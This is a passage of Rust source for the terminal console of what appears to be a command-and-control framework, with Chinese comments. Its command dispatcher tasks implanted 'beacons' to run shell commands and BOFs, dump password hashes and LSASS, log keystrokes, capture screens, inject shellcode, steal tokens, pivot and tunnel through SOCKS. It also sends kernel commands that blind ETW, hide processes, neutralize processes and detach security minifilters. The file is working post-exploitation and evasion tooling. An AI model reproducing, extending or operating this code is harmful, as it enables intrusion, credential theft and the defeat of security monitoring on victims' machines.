            for (i, r) in self.session_row_rects.iter().enumerate() {
                if row >= r.y && row < r.y + r.height && col >= r.x && col < r.x + r.width {
                    state.select(Some(i));
                    if let Some(s) = self.sessions.get(i) {
                        self.pane_tree
                            .set_session_id(self.focused_pane, Some(s.id.clone()));
                        self.log(&format!("selected beacon {}", short(&s.id)), Level::Ok);
                    }
                    self.overlay = Overlay::None;
                    return;
                }
            }
            // 点在 overlay 外 → 不处理（让窗格聚焦逻辑跑）。
        }
        // 无 overlay → 点击聚焦窗格。用与 render 一致的布局算 pane_area：
        // 顶部 statusbar 1 行 + 底部 input 3 行，中间是窗格区。
        let full = self.last_frame_size;
        if full.height < 8 {
            return; // 太小不处理（render 也走了 too-small 分支）
        }
        // 优先处理 view picker：若开着且点击落在它上面 → 选对应行视图并关闭。
        if let Some((picker_pane, _)) = &self.view_picker {
            if let Some(tab_rect) = self.view_tab_rect.get(picker_pane).copied() {
                let count = panes::PaneView::ALL.len();
                // picker 区域：tab 下方，每行 1 个视图，从 tab_rect.y+2 开始
                // （+1 进窗格内容区，+1 跳边框标题）。宽度固定 14（与 render 一致）。
                let picker_top = tab_rect.y.saturating_add(2);
                let picker_bot = picker_top + count as u16;
                if row >= picker_top
                    && row < picker_bot
                    && col >= tab_rect.x
                    && col < tab_rect.x + 14
                {
                    let idx = (row - picker_top) as usize;
                    if let Some(v) = panes::PaneView::ALL.get(idx).copied() {
                        self.pane_tree = self.pane_tree.clone().set_view(*picker_pane, v);
                    }
                    self.view_picker = None;
                    return;
                }
            }
            // 点在 picker 外的任何地方 → 关闭 picker（点 tab 外区域 = 取消）。
            // 但先让下面的窗格聚焦逻辑跑（可能点的是另一个窗格 tab）。
        }

        let pane_area = ratatui::layout::Rect {
            x: full.x,
            y: full.y + 1, // 跳过 statusbar
            width: full.width,
            height: full.height.saturating_sub(1 + 3), // statusbar + input
        };
        // 反查点击坐标落在哪个叶的 rect 里。
        let layouts = self.pane_tree.layout(pane_area);
        for (id, rect) in &layouts {
            if col >= rect.x
                && col < rect.x + rect.width
                && row >= rect.y
                && row < rect.y + rect.height
            {
                // 先聚焦该窗格（点哪聚焦哪）。
                if *id != self.focused_pane {
                    self.focused_pane = *id;
                }
                // 点中窗格后，检查是否点中了它的视图 tab（顶部边框行）。
                // 命中 → 开关该窗格的 view picker（而非直接切视图）。
                if let Some(tab_rect) = self.view_tab_rect.get(id).copied() {
                    if col >= tab_rect.x && col < tab_rect.x + tab_rect.width && row == tab_rect.y {
                        // toggle picker：已开则关，没开则开（初始选中当前视图）。
                        if self.view_picker.as_ref().is_some_and(|(pid, _)| pid == id) {
                            self.view_picker = None;
                        } else {
                            let mut st = ratatui::widgets::ListState::default();
                            // 初始选中当前视图对应行。
                            if let Some(cur) = self
                                .pane_tree
                                .leaves()
                                .iter()
                                .find(|(lid, _)| lid == id)
                                .map(|(_, v)| *v)
                            {
                                st.select(panes::PaneView::ALL.iter().position(|v| *v == cur));
                            }
                            self.view_picker = Some((*id, st));
                        }
                        return;
                    }
                }
                // 点在窗格内容区（非 tab）。
                // 若该窗格是 SessionList 视图，检查是否点中了某 session 行 → 切换 beacon。
                if let Some(rows) = self.pane_session_rows.get(id) {
                    for (r, sid) in rows {
                        if col >= r.x && col < r.x + r.width && row >= r.y && row < r.y + r.height {
                            self.pane_tree.set_session_id(*id, Some(sid.clone()));
                            self.log(
                                &format!("[pane {}] selected beacon {}", id, short(sid)),
                                Level::Ok,
                            );
                            return;
                        }
                    }
                }
                // 点在内容区非 session 行 → 关掉任何开着的 picker。
                self.view_picker = None;
                return;
            }
        }
    }

    fn submit(&mut self) {
        // 从焦点窗格取出输入，避免动到其他窗格的 input/cursor/popup。
        let raw = {
            let st = self.focused_state_mut();
            let r = std::mem::take(&mut st.input);
            st.cursor = 0;
            st.popup_open = false;
            st.hist_idx = None;
            r
        };
        if !raw.trim().is_empty() {
            self.history.push(raw.clone());
            // Cap history to prevent unbounded growth（P1-1c），与 STREAM_CAP 对称。
            if self.history.len() > HISTORY_CAP {
                let drop = self.history.len() - HISTORY_CAP;
                self.history.drain(..drop);
            }
        }
        match input::classify_with(&raw, &self.config.aliases) {
            Input::Empty => {}
            Input::Shell(cmd) => self.run_shell(&cmd),
            Input::Meta { name, args } => self.run_meta(&name, &args),
        }
    }

    fn run_shell(&mut self, cmd: &str) {
        let Some(s) = self.current_session().cloned() else {
            self.log(
                "! no beacon selected — use /use <id> or /sessions",
                Level::Err,
            );
            return;
        };
        self.log(&format!("[{}] $ {}", short(&s.id), cmd), Level::Info);
        self.send(Cmd::Shell {
            session: s.id,
            args: cmd.to_string(),
            parse: ParseAs::None,
        });
    }

    fn run_meta(&mut self, name: &str, args: &str) {
        match name {
            "/help" => {
                for m in META_COMMANDS {
                    self.log(
                        &format!("{:14} {:18} {}", m.name, m.args_hint, m.help),
                        Level::Info,
                    );
                }
            }
            "/clear" => self.stream.clear(),
            "/theme" => {
                // /theme             — 显示当前主题
                // /theme mocha       — Catppuccin Mocha（默认）
                // /theme highcontrast — WCAG AAA 高对比度
                // /theme nocolor     — 无色（遵守 NO_COLOR）
                let sub = args.trim();
                if sub.is_empty() {
                    self.log(
                        &format!(
                            "current theme: {} (options: mocha, highcontrast, nocolor)",
                            self.config.theme
                        ),
                        Level::Info,
                    );
                } else {
                    let valid = matches!(
                        sub.to_ascii_lowercase().as_str(),
                        "mocha" | "highcontrast" | "hc" | "nocolor"
                    );
                    if !valid {
                        self.log(
                            &format!("! unknown theme '{sub}' (mocha | highcontrast | nocolor)"),
                            Level::Warn,
                        );
                        return;
                    }
                    // 热切换调色板（RwLock 写入，立即生效，下一帧渲染就用新色）。
                    crate::theme::switch(sub);
                    // 持久化到配置文件，下次启动生效。
                    self.config.theme = sub.to_string();
                    match self.config.save() {
                        Ok(()) => self.log(&format!("theme switched to {sub}"), Level::Ok),
                        Err(e) => {
                            self.log(&format!("theme switched but save failed: {e}"), Level::Warn)
                        }
                    }
                }
            }
            "/alias" => {
                // /alias add <name> <command...>  /  /alias rm <name>  /  /alias list
                let mut parts = args.split_whitespace();
                match parts.next() {
                    Some("add") => {
                        let name = match parts.next() {
                            Some(n) => n.to_string(),
                            None => {
                                self.log("usage: /alias add <name> <command...>", Level::Warn);
                                return;
                            }
                        };
                        let cmd: String = parts.collect::<Vec<_>>().join(" ");
                        if cmd.is_empty() {
                            self.log("usage: /alias add <name> <command...>", Level::Warn);
                            return;
                        }
                        self.config.set_alias(&name, &cmd);
                        match self.config.save() {
                            Ok(()) => self.log(&format!("alias {name} = {cmd}"), Level::Ok),
                            Err(e) => self.log(&format!("! save alias: {e}"), Level::Err),
                        }
                    }
                    Some("rm") | Some("del") | Some("remove") => {
                        let name = match parts.next() {
                            Some(n) => n.to_string(),
                            None => {
                                self.log("usage: /alias rm <name>", Level::Warn);
                                return;
                            }
                        };
                        if self.config.del_alias(&name) {
                            let _ = self.config.save();
                            self.log(&format!("removed alias {name}"), Level::Ok);
                        } else {
                            self.log(&format!("! no alias named {name}"), Level::Warn);
                        }
                    }
                    Some("list") | None => {
                        if self.config.aliases.is_empty() {
                            self.log("(no aliases)", Level::Warn);
                        } else {
                            let pairs: Vec<(String, String)> = self
                                .config
                                .aliases
                                .iter()
                                .map(|(n, c)| (n.clone(), c.clone()))
                                .collect();
                            for (n, c) in &pairs {
                                self.log(&format!("  {n} = {c}"), Level::Info);
                            }
                        }
                    }
                    Some(other) => self.log(
                        &format!("! /alias: unknown subcommand '{other}' (add/rm/list)"),
                        Level::Err,
                    ),
                }
            }
            "/topo" => {
                // 用拓扑布局算法画 session 关系图。
                let nodes: Vec<(String, String)> = self
                    .sessions
                    .iter()
                    .map(|s| {
                        let label = self
                            .sessions_meta
                            .get(&s.id)
                            .alias
                            .clone()
                            .unwrap_or_else(|| s.hostname.clone());
                        (s.id.clone(), label)
                    })
                    .collect();
                let topo = topology::layout(&nodes, &[]);
                if topo.nodes.is_empty() {
                    self.log("(no beacons to graph)", Level::Warn);
                } else {
                    self.log(
                        &format!(
                            "╔══ topology: {} nodes, {} edges ═══",
                            topo.nodes.len(),
                            topo.edges.len()
                        ),
                        Level::Info,
                    );
                    // 按层分组渲染 ASCII 树
                    let max_y = topo.nodes.iter().map(|n| n.y).max().unwrap_or(0);
                    for layer in 0..=max_y {
                        let layer_nodes: Vec<&topology::TopoNode> =
                            topo.nodes.iter().filter(|n| n.y == layer).collect();
                        if layer_nodes.is_empty() {
                            continue;
                        }
                        // 层标签
                        if layer == 0 {
                            self.log("║", Level::Info);
                        }
                        // 节点行
                        let node_strs: Vec<String> = layer_nodes
                            .iter()
                            .map(|n| {
                                let mark = if n.is_beacon { "◆" } else { "◇" };
                                let star = if self.sessions_meta.get(&n.id).favorite {
                                    " ★"
                                } else {
                                    ""
                                };
                                format!("{mark} {}{star}", n.label)
                            })
                            .collect();
                        self.log(
                            &format!("║  L{}  {}", layer, node_strs.join("  ──→  ")),
                            Level::Info,
                        );
                        // 连接线（非最后一层）
                        if layer < max_y {
                            self.log("║  │", Level::Info);
                        }
                    }
                    // 边列表
                    if !topo.edges.is_empty() {
                        self.log("║", Level::Info);
                        self.log("║  edges:", Level::Info);
                        for e in &topo.edges {
                            self.log(
                                &format!(
                                    "║    {} ─{}→ {}",
                                    short_topo(&topo, &e.from),
                                    e.label,
                                    short_topo(&topo, &e.to)
                                ),
                                Level::Info,
                            );
                        }
                    }
                    self.log("╚══════════════════════════════", Level::Info);
                }
            }
            "/creds" => {
                // /creds                 — 列出整个凭据库
                // /creds export json|csv — 导出
                // /creds find <query>    — 搜索（kind:hash / user:admin）
                // /creds sync [reveal]   — 从 server /api/creds 拉取并入库
                // /creds <shell cmd>     — 跑 shell dump，结果解析后入库
                let sub = args.trim();
                if sub == "export json" {
                    self.log(&self.creds.export_json(), Level::Info);
                } else if sub == "export csv" {
                    self.log(&self.creds.export_csv(), Level::Info);
                } else if let Some(query) = sub.strip_prefix("find ") {
                    // 搜索凭据库
                    let hits = self.creds.search(query.trim());
                    if hits.is_empty() {
                        self.log(&format!("(no creds match '{query}')"), Level::Warn);
                    } else {
                        let rows: Vec<CredEntry> = hits
                            .iter()
                            .map(|c| CredEntry {
                                source: c.source.clone(),
                                principal: c.principal.clone(),
                                kind: c.kind,
                                secret: c.secret.clone(),
                            })
                            .collect();
                        self.log(&format!("{} match(es)", rows.len()), Level::Ok);
                        self.overlay = Overlay::Creds(rows);
                    }
                } else if sub == "list" || sub.is_empty() {
                    if self.creds.entries.is_empty() {
                        self.log(
                            "(credstore empty — run a cred dump BOF or /creds sync first)",
                            Level::Warn,
                        );
                    } else {
                        let rows: Vec<CredEntry> = self
                            .creds
                            .entries
                            .iter()
                            .map(|c| CredEntry {
                                source: c.source.clone(),
                                principal: c.principal.clone(),
                                kind: c.kind,
                                secret: c.secret.clone(),
                            })
                            .collect();
                        self.overlay = Overlay::Creds(rows);
                    }
                } else if sub.starts_with("add ") {
                    let mut parts = sub.split_whitespace().skip(1);
                    let realm = parts.next().unwrap_or("").to_string();
                    let user = parts.next().unwrap_or("").to_string();
                    let kind = parts.next().unwrap_or("").to_string();
                    let secret = parts.next().unwrap_or("").to_string();
                    if realm.is_empty() || user.is_empty() || kind.is_empty() || secret.is_empty() {
                        self.log(
                            "usage: /creds add <realm> <user> <kind> <secret>",
                            Level::Warn,
                        );
                        return;
                    }
                    self.send(crate::rest::Cmd::AddCred {
                        realm,
                        user,
                        kind,
                        secret,
                    });
                } else if sub.starts_with("del ") {
                    let mut parts = sub.split_whitespace().skip(1);
                    let realm = parts.next().unwrap_or("").to_string();
                    let user = parts.next().unwrap_or("").to_string();
                    let kind = parts.next().unwrap_or("").to_string();
                    if realm.is_empty() || user.is_empty() || kind.is_empty() {
                        self.log("usage: /creds del <realm> <user> <kind>", Level::Warn);
                        return;
                    }
                    self.send(crate::rest::Cmd::DelCred { realm, user, kind });
                } else if sub == "sync" || sub.starts_with("sync ") {
                    let reveal = sub.contains("reveal");
                    self.send(Cmd::FetchCreds { reveal });
                } else {
                    // 当作 shell 命令跑，结果解析后入库
                    self.run_parsed_shell(sub, "/creds", ShellFor::Creds);
                }
            }
            "/profile" => {
                self.send(crate::rest::Cmd::FetchProfile);
            }
            "/chan" => {
                let mut parts = args.split_whitespace();
                let sub = match parts.next() {
                    Some(s) => s,
                    None => {
                        self.log("usage: /chan close <id>", Level::Warn);
                        return;
                    }
                };
                if sub == "close" {
                    let chan: u32 = match parts.next().and_then(|x| x.parse().ok()) {
                        Some(c) => c,
                        None => {
                            self.log("usage: /chan close <id>", Level::Warn);
                            return;
                        }
                    };
                    self.send(crate::rest::Cmd::CloseChan { chan });
                } else {
                    self.log(
                        &format!("! /chan: unknown subcommand '{sub}' (close)"),
                        Level::Err,
                    );
                }
            }
            "/audit" => {
                let sub = args.trim();
                if sub == "verify" {
                    self.send(crate::rest::Cmd::VerifyAudit);
                    return;
                }
                // /audit                       — 全量审计日志
                // /audit operator <name>       — 按操作员过滤
                // /audit action <task|cred_*>  — 按动作过滤
                // /audit limit <n>             — 限制条数
                let mut filters: Option<String> = None;
                let mut operator: Option<String> = None;
                let mut action: Option<String> = None;
                let mut limit: Option<u32> = None;
                let mut it = args.split_whitespace();
                while let Some(k) = it.next() {
                    match k {
                        "operator" => operator = it.next().map(|s| s.to_string()),
                        "action" => action = it.next().map(|s| s.to_string()),
                        "limit" => limit = it.next().and_then(|s| s.parse().ok()),
                        _ => {
                            filters = Some(k.to_string());
                        }
                    }
                }
                let _ = filters;
                self.send(Cmd::FetchAudit {
                    operator,
                    action,
                    limit,
                });
            }
            "/connect" => {
                let mut parts = args.split_whitespace();
                let url = match parts.next() {
                    Some(u) => u.to_string(),
                    None => {
                        self.log("usage: /connect <url> [token]", Level::Warn);
                        return;
                    }
                };
                let token = parts.next().map(|s| s.to_string());
                self.log(&format!("connecting to {url} …",), Level::Info);
                self.send(Cmd::Connect(url, token));
            }
            "/sessions" => {
                if self.sessions.is_empty() {
                    self.log("(no beacons)", Level::Warn);
                } else {
                    // 支持过滤：/sessions tag:web star alias:db
                    let filter = session_meta::parse_filter(args);
                    let filtered: Vec<usize> = self
                        .sessions
                        .iter()
                        .enumerate()
                        .filter(|(_, s)| {
                            let m = self.sessions_meta.get(&s.id);
                            let tags_ok = filter.tags.iter().all(|t| m.tags.iter().any(|x| x == t));
                            let star_ok = !filter.star_only || m.favorite;
                            let alias_ok = filter.alias_contains.as_ref().is_none_or(|sub| {
                                m.alias.as_ref().is_some_and(|a| a.contains(sub))
                                    || s.hostname.contains(sub)
                            });
                            tags_ok && star_ok && alias_ok
                        })
                        .map(|(i, _)| i)
                        .collect();
                    if filtered.is_empty() {
                        self.log(&format!("(no beacons match '{args}')",), Level::Warn);
                    } else {
                        let mut st = ListState::default();
                        let cur_idx = self
                            .current_session()
                            .and_then(|s| self.sessions.iter().position(|x| x.id == s.id));
                        st.select(
                            cur_idx
                                .filter(|i| filtered.contains(i))
                                .or(filtered.first().copied()),
                        );
                        self.overlay = Overlay::Sessions(st);
                    }
                }
            }
            "/info" => {
                // 全字段会话详情 overlay：把 SessionView 里一直有但 Sessions 行
                // 列表/状态栏放不下的字段（pid/pending/age/ja3/ja4 + 本地 meta）
                // 一次性展示。本地数据 overlay，无 worker round-trip。
                match self.current_session() {
                    Some(s) => self.overlay = Overlay::SessionDetail(s.id.clone()),
                    None => self.log("! no beacon selected", Level::Warn),
                }
            }
            "/tasks" => {
                // 拉取当前会话排队中（未投递）的任务。worker-driven overlay，
                // 仿 /audit。解决"任务下发后状态黑盒"——看不到是还在排队还是已投递。
                match self.current_session() {
                    Some(s) => self.send(Cmd::FetchTasks {
                        session: s.id.clone(),
                    }),
                    None => self.log("! no beacon selected", Level::Warn),
                }
            }
            "/use" => {
                let id = args.trim();
                if id.is_empty() {
                    self.log("usage: /use <id-prefix>", Level::Warn);
                    return;
                }
                match self.sessions.iter().position(|s| s.id.starts_with(id)) {
                    Some(i) => {
                        if let Some(s) = self.sessions.get(i) {
                            self.pane_tree
                                .set_session_id(self.focused_pane, Some(s.id.clone()));
                        }
                        self.log(
                            &format!("selected beacon {}", short(&self.sessions[i].id)),
                            Level::Ok,
                        );
                    }
                    None => self.log(&format!("! no beacon matching {id}"), Level::Err),
                }
            }
            "/rename" | "/tag" | "/untag" | "/star" | "/note" => {
                self.session_meta_cmd(name, args);
            }
            "/ls" => self.run_parsed_shell(args, "/ls", ShellFor::Ls),
            "/ps" => self.run_parsed_shell(args, "/ps", ShellFor::Ps),
            "/bof" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let file = match parts.next() {
                    Some(f) => f.to_string(),
                    None => {
                        self.log("usage: /bof <file.o> [args]", Level::Warn);
                        return;
                    }
                };
                let bof_args = parts.collect::<Vec<_>>().join(" ");
                let data = match std::fs::read(&file) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {file}: {e}"), Level::Err);
                        return;
                    }
                };
                let name = std::path::Path::new(&file)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("bof")
                    .to_string();
                self.log(&format!("[{}] bof {} …", short(&s.id), name), Level::Info);
                self.send(Cmd::Bof {
                    session: s.id,
                    name,
                    args: bof_args,
                    data_hex: hex::encode(&data),
                });
            }
            "/upload" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let local = match parts.next() {
                    Some(l) => l.to_string(),
                    None => {
                        self.log("usage: /upload <local> <remote>", Level::Warn);
                        return;
                    }
                };
                let remote = match parts.next() {
                    Some(r) => r.to_string(),
                    None => {
                        self.log("usage: /upload <local> <remote>", Level::Warn);
                        return;
                    }
                };
                let data = match std::fs::read(&local) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {local}: {e}"), Level::Err);
                        return;
                    }
                };
                self.log(
                    &format!("[{}] upload {local} -> {remote}", short(&s.id)),
                    Level::Info,
                );
                self.send(Cmd::Upload {
                    session: s.id,
                    name: remote,
                    data_hex: hex::encode(&data),
                });
            }
            "/download" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let path = match parts.next() {
                    Some(p) => p.to_string(),
                    None => {
                        self.log("usage: /download <remote> [local]", Level::Warn);
                        return;
                    }
                };
                let local = parts.next().map(|s| s.to_string());
                self.log(&format!("[{}] download {path}", short(&s.id)), Level::Info);
                self.send(Cmd::Download {
                    session: s.id,
                    path,
                    local,
                });
            }
            "/sleep" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                match parse_sleep_args(args) {
                    SleepSpec::Seconds(secs) => {
                        self.send(Cmd::Sleep {
                            session: s.id.clone(),
                            seconds: secs,
                            jitter_pct: 0,
                        });
                        self.log(
                            &format!("[{}] tasked sleep {secs}s", short(&s.id)),
                            Level::Info,
                        );
                    }
                    SleepSpec::SecondsJitter(secs, jit) => {
                        self.send(Cmd::Sleep {
                            session: s.id.clone(),
                            seconds: secs,
                            jitter_pct: jit,
                        });
                        self.log(
                            &format!("[{}] tasked sleep {secs}s (±{jit}%)", short(&s.id)),
                            Level::Info,
                        );
                    }
                    SleepSpec::Usage(msg) => self.log(&msg, Level::Warn),
                }
            }
            "/ping" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Ping { session: s.id });
            }
            "/screenshot" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let monitor: u8 = args.trim().parse().unwrap_or(0);
                self.log(&format!("[{}] screenshot…", short(&s.id)), Level::Info);
                self.send(Cmd::Screenshot {
                    session: s.id,
                    monitor,
                });
            }
            "/portscan" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let host = match it.next() {
                    Some(h) => h.to_string(),
                    None => {
                        self.log("usage: /portscan <host> <ports>", Level::Warn);
                        return;
                    }
                };
                let ports = match it.next() {
                    Some(p) => p.to_string(),
                    None => {
                        self.log("usage: /portscan <host> <ports>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Portscan {
                    session: s.id,
                    host,
                    ports,
                });
            }
            "/net" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Net {
                    session: s.id,
                    query: args.trim().to_string(),
                });
            }
            "/drive" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::DriveInfo { session: s.id });
            }
            "/clipboard" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Clipboard { session: s.id });
            }
            "/env" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Env {
                    session: s.id,
                    name: args.trim().to_string(),
                });
            }
            "/keylog" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let action = match args.trim() {
                    "start" => 0,
                    "stop" => 1,
                    "dump" | "" => 2,
                    _ => {
                        self.log("usage: /keylog <start|stop|dump>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Keylog {
                    session: s.id,
                    action,
                });
            }
            "/screenwatch" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let secs: u32 = match args.trim().parse() {
                    Ok(v) if v > 0 => v,
                    _ => {
                        self.log("usage: /screenwatch <secs>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Screenwatch {
                    session: s.id,
                    interval_secs: secs,
                });
            }
            "/hashdump" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                // method 语义（跨后端统一）：0=SAM, 1=SYSTEM, 2=LSASS(deferred),
                // 3=macOS-shadow。默认 sam(0)。`lsass`/`mac` 保留为兼容别名但
                // 映射到正确语义（lsass→2 deferred，mac→3 shadow）。
                let method = match args.trim() {
                    "sam" | "" => 0,
                    "system" => 1,
                    "lsass" => 2,
                    "shadow" | "mac" => 3,
                    other => {
                        self.log(
                            &format!("! unknown hashdump method '{other}': use sam|system|shadow"),
                            Level::Err,
                        );
                        return;
                    }
                };
                self.send(Cmd::Hashdump {
                    session: s.id,
                    method,
                });
            }
            "/getuid" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::GetUid { session: s.id });
            }
            "/inject" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                // /inject <method> <pid|spawn_to> <file.bin>
                let mut parts = args.split_whitespace();
                let method: u8 = match parts.next().and_then(|m| m.parse().ok()) {
                    Some(v) => v,
                    None => {
                        self.log(
                            "usage: /inject <method 0|1|2> <pid|spawn_to> <file>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                let target = parts.next().unwrap_or("").to_string();
                let file = match parts.next() {
                    Some(f) => f.to_string(),
                    None => {
                        self.log("usage: /inject <method> <pid|spawn_to> <file>", Level::Warn);
                        return;
                    }
                };
                let data = match std::fs::read(&file) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {file}: {e}"), Level::Err);
                        return;
                    }
                };
                // Parse target: if numeric, it's a pid; otherwise spawn_to name.
                let (pid, spawn_to) = match target.parse::<u32>() {
                    Ok(p) => (p, String::new()),
                    Err(_) => (0, target),
                };
                let sc_hex = hex::encode(&data);
                self.send(Cmd::Inject {
                    session: s.id,
                    method,
                    pid,
                    spawn_to,
                    sc_hex,
                });
            }
            "/steal" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let pid: u32 = match args.trim().parse() {
                    Ok(v) => v,
                    _ => {
                        self.log("usage: /steal <pid>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::StealToken { session: s.id, pid });
            }
            "/make_token" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                // /make_token DOMAIN\user password [logon_type 1|2|3]
                let parts: Vec<&str> = args.split_whitespace().collect();
                if parts.len() < 2 {
                    self.log(
                        "usage: /make_token DOMAIN\\user password [1|2|3]",
                        Level::Err,
                    );
                    return;
                }
                let du = parts[0];
                let (domain, user) = match du.split_once('\\') {
                    Some((d, u)) => (d.to_string(), u.to_string()),
                    None => (String::new(), du.to_string()), // local account
                };
                let password = parts[1].to_string();
                let logon_type = parts.get(2).and_then(|t| t.parse::<u8>().ok()).unwrap_or(1);
                self.send(Cmd::MakeToken {
                    session: s.id,
                    domain,
                    user,
                    password,
                    logon_type,
                });
            }
            "/rev2self" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Rev2Self { session: s.id });
            }
            "/cd" | "/mkdir" | "/rm" => {
                let (op, path) = self.fileop_one_arg(name, args);
                let Some((s, p)) = path else { return };
                self.send(Cmd::FileOp {
                    session: s.id,
                    op,
                    path: p,
                    dest: None,
                });
            }
            "/mv" | "/cp" => {
                let (op, parts) = self.fileop_two_args(name, args);
                let Some((s, src, dst)) = parts else { return };
                self.send(Cmd::FileOp {
                    session: s.id,
                    op,
                    path: src,
                    dest: Some(dst),
                });
            }
            "/pivot" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let host = match it.next() {
                    Some(h) => h.to_string(),
                    None => {
                        self.log("usage: /pivot <host> <port>", Level::Warn);
                        return;
                    }
                };
                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
                    Some(p) => p,
                    None => {
                        self.log("usage: /pivot <host> <port>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Pivot {
                    session: s.id,
                    host,
                    port,
                });
            }
            "/socks" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let chan: u32 = match it.next().and_then(|x| x.parse().ok()) {
                    Some(c) => c,
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                let op: u8 = match it.next().and_then(|x| x.parse().ok()) {
                    Some(o) => o,
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                let addr = match it.next() {
                    Some(a) => a.to_string(),
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
                    Some(p) => p,
                    None => {
                        self.log("usage: /socks <chan> <op> <addr> <port>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Socks {
                    session: s.id,
                    chan,
                    op,
                    addr,
                    port,
                });
            }
            "/kill" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a beacon first", Level::Err);
                    return;
                };
                self.send(Cmd::Exit {
                    session: s.id.clone(),
                });
                self.log(&format!("[{}] tasked exit", short(&s.id)), Level::Warn);
            }
            "/driver-status" => self.send(Cmd::KernelStatus),
            "/blind-etw" => self.send(Cmd::KernelBlindEtw),
            "/hide" => {
                let pid: u32 = match args.trim().parse() {
                    Ok(p) => p,
                    Err(_) => { self.log("usage: /hide <pid>", Level::Warn); return; }
                };
                self.send(Cmd::KernelHide { pid });
            }
            "/dump-lsass" => {
                let pid: u32 = match args.trim().parse() {
                    Ok(p) => p,
                    Err(_) => { self.log("usage: /dump-lsass <pid>", Level::Warn); return; }
                };
                self.send(Cmd::KernelDumpLsass { pid });
            }
            "/neutralize" => {
                let pid: u32 = match args.trim().parse() {
                    Ok(p) => p,
                    Err(_) => { self.log("usage: /neutralize <pid>", Level::Warn); return; }
                };
                self.send(Cmd::KernelNeutralize { pid });
            }
            "/detach-mf" => self.send(Cmd::KernelDetachMinifilter),
            other => self.log(
                &format!("! unknown command {other} — try /help",),
                Level::Err,
            ),
        }
    }

    /// Run a shell command whose output we parse into a table overlay.
    /// The command text depends on the beacon's OS guess; we pick POSIX by
    /// default (dev agent runs on macOS/Linux) and Windows if the beacon's os
    /// string mentions "windows".
    fn run_parsed_shell(&mut self, args: &str, label: &str, which: ShellFor) {
        let Some(s) = self.current_session().cloned() else {
            self.log("! select a beacon first", Level::Err);
            return;
        };
        let is_windows = s.os.to_ascii_lowercase().contains("windows");
        let (cmd, parse) = match which {
            ShellFor::Ls => {
                let cmd = if is_windows {
                    format!("cmd /c dir {}", args)
                } else {
                    format!("ls -l {}", args)
                };
                (cmd, ParseAs::Files)
            }
            ShellFor::Ps => {
                let cmd = if is_windows {
                    "tasklist /fo csv /nh".to_string()
                } else {
                    "ps aux".to_string()
                };
                (cmd, ParseAs::Procs)
            }
            ShellFor::Creds => {
                // No standard command; operator is expected to have dumped via a
                // BOF. We run the typed args verbatim as a shell command and
                // parse the result.
                (args.to_string(), ParseAs::Creds)
            }
        };
        self.log(
            &format!("[{}] {} $ {}", short(&s.id), label, cmd),
            Level::Info,
        );
        self.send(Cmd::Shell {
            session: s.id,
            args: cmd,
            parse,
        });
    }

    /// 单参数文件操作（cd/mkdir/rm）的参数解析。返回 (op_string, Some((session, path)))。
    fn fileop_one_arg(
        &mut self,
        name: &str,
        args: &str,
    ) -> (String, Option<(SessionView, String)>) {
        let op = name.trim_start_matches('/').to_string();
